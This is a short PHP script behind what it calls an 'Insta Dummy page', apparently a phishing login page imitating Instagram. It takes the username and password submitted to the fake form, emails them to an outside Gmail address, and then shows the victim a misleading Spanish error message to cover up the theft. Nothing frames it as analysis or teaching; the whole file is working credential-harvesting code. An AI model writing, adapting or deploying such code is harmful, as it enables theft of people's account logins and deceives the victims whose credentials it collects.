<?php

// Variable settings
$username = $_POST['u_name'] ?? '';  // Fetch username (using null coalescing operator)
$passcode = $_POST['pass'] ?? '';    // Fetch password (using null coalescing operator)

$subject = "Someone Login ! Insta Dummy page";
$to = "xxxxxxxxxxx@gmail.com";

$txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i) username [break] (ii) password;

// Check input fields
if (!empty($username) and !empty($passcode)) {

    mail($to, $subject, $txt);
    echo "<script type='text/javascript'>alert('Error ! No se puede iniciar sesión, Cree una cuenta  ');
        window.location.replace('');
        </script>";

} else {

    echo "<script type='text/javascript'>alert('Por favor ingrese el nombre de usuario o contraseña correctos. Intentar otra vez ');
        window.history.go(-1);
        </script>";
}
?>
